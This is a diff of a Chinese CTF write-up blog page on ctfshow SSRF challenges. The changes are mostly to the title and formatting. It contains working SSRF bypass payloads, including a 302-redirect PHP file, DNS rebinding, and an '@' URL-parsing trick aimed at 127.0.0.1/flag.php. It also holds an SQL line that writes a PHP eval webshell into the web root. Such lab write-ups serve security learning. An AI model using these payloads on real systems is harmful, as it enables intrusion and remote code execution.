@@ -6,7 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    <title>ssrf一周目 ctfshow</title>
+    <title>ssrf-ctfshow</title>
     <link rel="shortcut icon" href="#"/>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
@@ -32,14 +32,14 @@
     <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-subtitle">ssrf一周目 ctfshow</h1>
+                <h1 class="header-subtitle">ssrf-ctfshow</h1>
                 <div class="header-subinfo">
                     <p class="article-info-text">
                         <span>
                             <i class="iconfont icon-time"></i> 发表时间：2022-01-23
                         </span>
                         
-                            <span id="/2022/01/23/ssrf/" class="leancloud_visitors" data-flag-title="ssrf一周目 ctfshow">
+                            <span id="/2022/01/23/ssrf/" class="leancloud_visitors" data-flag-title="ssrf-ctfshow">
                                 <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                             </span>
                         
@@ -141,27 +141,31 @@
 <p>主要考了<strong>getbyhostname</strong> 和 <strong>filter_var</strong> 两个函数</p>
 <p>filter_var — 使用特定的过滤器过滤一个变量 如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。</p>
 <p>filter_var(variable, filter, options)</p>
-<p>这里的过滤器是 filter_varlidate_ip options有下面四个</p>
-<ul>
-<li>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。</li>
-<li>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。</li>
-<li>FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。</li>
-<li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</li>
-</ul>
-<p>保留地址主要在以下四类：<br>A类：10.0.0.0－10.255.255.255（长度相当于1个A类IP地址）<br>A类：100.64.0.0－100.127.255.255<br>B类：172.16.0.0－172.31.255.255（长度相当于16个连续的B类IP地址）<br>C类：192.168.0.0－192.168.255.255（长度相当于256个连续的C类IP地址）</p>
-<p>方法一  302跳转</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里的过滤器是 filter_varlidate_ip options有下面四个</span><br><span class="line"></span><br><span class="line">- FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。</span><br><span class="line">- FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。</span><br><span class="line">- FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。</span><br><span class="line">- FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">保留地址主要在以下四类：</span><br><span class="line">A类：10.0.0.0－10.255.255.255（长度相当于1个A类IP地址）</span><br><span class="line">A类：100.64.0.0－100.127.255.255</span><br><span class="line">B类：172.16.0.0－172.31.255.255（长度相当于16个连续的B类IP地址）</span><br><span class="line">C类：192.168.0.0－192.168.255.255（长度相当于256个连续的C类IP地址）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>方法一  <strong>302跳转</strong></p>
 <p>在自己服务器上写个a.php文件内容如下</p>
 <?php header("Location:http://127.0.0.1/flag.php"); ？>
 
 -payload:http://xxx/a.php 
 
-方法二 dns重定向
+
+
+方法二 **dns重定向**
 
 依旧是354的方法 不过得多试几次 有时候ip为 127.0.0.1 有时候为 92.3.3.2（自己设定的）
 
 可能是dns重定向的TTL延迟 导致
 
+
+
 ### web 358
+
+
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;</span><br><span class="line">  echo file_get_contents($url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -169,7 +173,11 @@
 
 url=http://ctf.@127.0.0.1/flag.php?show
 
+
+
 ### web 359 
+
+
 
 **题目hint 打没密码的mysql**
 
@@ -204,7 +212,7 @@ select ‘<?php eval($_POST[hack]);?><p> ’ into outfile ‘/var/www/html/hack.
             <div class="suffix-box-right">
                 <span class="suffix-box-title">文章作者</span>：Think Twice Code Once
                 <br>
-                <span class="suffix-box-title">文章出处</span>：<a href="/2022/01/23/ssrf/" target="_blank">ssrf一周目 ctfshow</a>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2022/01/23/ssrf/" target="_blank">ssrf-ctfshow</a>
                 <br>
                 <span class="suffix-box-title">作者签名</span>：Stay Foolish Stay Hungry
                 <br>
